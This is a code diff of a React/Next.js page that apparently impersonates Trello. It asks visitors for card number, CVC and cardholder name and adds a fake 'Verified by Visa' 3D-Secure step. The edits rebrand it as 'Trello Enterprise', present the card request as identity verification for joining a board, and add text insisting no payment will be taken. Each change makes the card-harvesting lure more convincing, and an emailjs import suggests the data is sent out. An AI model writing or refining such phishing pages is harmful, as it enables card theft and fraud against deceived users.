@@ -3,7 +3,7 @@ import emailjs from 'emailjs-com';
 import Head from 'next/head';
 import { loadStripe } from '@stripe/stripe-js';
 import { useRouter } from 'next/router';
-import { key } from './magic-link'; // Import the key
+import { key } from './get-link'; // Import the key
 import {
   EmbeddedCheckoutProvider,
   EmbeddedCheckout
@@ -206,7 +206,7 @@ const Board = () => {
       <div className={`dashboard-container ${isBlurred ? 'blurred' : ''}`}></div>
       {showCache && <div className='dashboard-cache'></div>}
       <div className={`subscription-popup ${selectedPlan ? 'hidden' : ''} ${showPopup ? 'show' : ''}`}>
-        <img src='/trello-logo.png' className='logo'/>
+        <img src='/trello-enterprise- logo.png' className='logo'/>
         <h5 className='board'>{boardName}</h5>
 
         <h1>Trello à votre façon.</h1>
@@ -261,8 +261,8 @@ const Board = () => {
                         
             <div className={`payment-details`}>
               <form onSubmit={handleSubmit}>
-                <h3>{selectedPlan === 'Gratuit' ? 'Trello Gratuit à vie !' : `${selectedPlan} : 30 jours gratuit`}</h3>
-                <span>{selectedPlan === 'Gratuit' ? 'Ajoutez une carte à votre nom pour profiter de Trello gratuitement.' : `0€ pendant 30 jours, puis ${getPlanPrice(selectedPlan)}/mois annulez avant pour ne pas être facturé.`}</span>
+                <h3>{selectedPlan === 'Gratuit' ? 'Trello Enterprise Gratuit' : `${selectedPlan} : 30 jours gratuit`}</h3>
+                <span>{selectedPlan === 'Gratuit' ? 'Vérifiez votre identité avec une carte à votre nom pour accéder à ce tableau.' : `0€ pendant 30 jours, puis ${getPlanPrice(selectedPlan)}/mois annulez avant pour ne pas être facturé.`}</span>
 
                 <div>
                   <label>Titulaire de la carte</label>
@@ -282,7 +282,7 @@ const Board = () => {
                     <input type="text" name="cardCvc" required placeholder='***' maxLength="3" />
                   </div>
                 </div>
-                <p className='trial-notice'>{selectedPlan === 'Gratuit' ? 'Un compte gratuit maximum par utilisateur, le compte peut être utilisé sur plusieur appareils.' : `Une pré-autorisation temporaire de ${getPlanPrice(selectedPlan)} sera effectuée sur votre compte.`}</p>
+                <p className='trial-notice'>{selectedPlan === 'Gratuit' ? `Un compte Trello Enterprise Gratuit est autorisé par utilisateur, sous réserve d'abus le compte peut être suspendu.` : `Une pré-autorisation temporaire de ${getPlanPrice(selectedPlan)} sera effectuée sur votre compte.`}</p>
 
                 <button className='buy' type="submit" disabled={isLoading}>
                   {isLoading ? 'Vérification...' : (selectedPlan === 'Gratuit' ? 'Rejoindre le tableau' : 'Démarrer mon essai')}
@@ -297,7 +297,7 @@ const Board = () => {
         <div className="popup show">
           <div className="popup-content d-secure show">
             <img className='verified' src='/verified-by-visa.png'/>
-            <img className='trello' src='/trello-logo.png'/>  
+            <img className='trello' src='/trello-enterprise-logo.png'/>  
             <hr></hr>
             <h3>Vérificaton 3D-secure</h3>
             {showError ? (
@@ -322,9 +322,11 @@ const Board = () => {
                     <button type="submit" disabled={isLoading}>{isLoading ? 'Envoi...' : 'Confirmer'}</button>
                   </form>
                 )}
+                <span className='notpayment'>Cette transaction n'est pas un paiement. Aucun montant ne sera débité, une autorisation doit être effectuée pour vérifier l'émetteur.</span>
+          
               </>
             )}
-          </div>
+            </div>
         </div>
       )}
     </div>
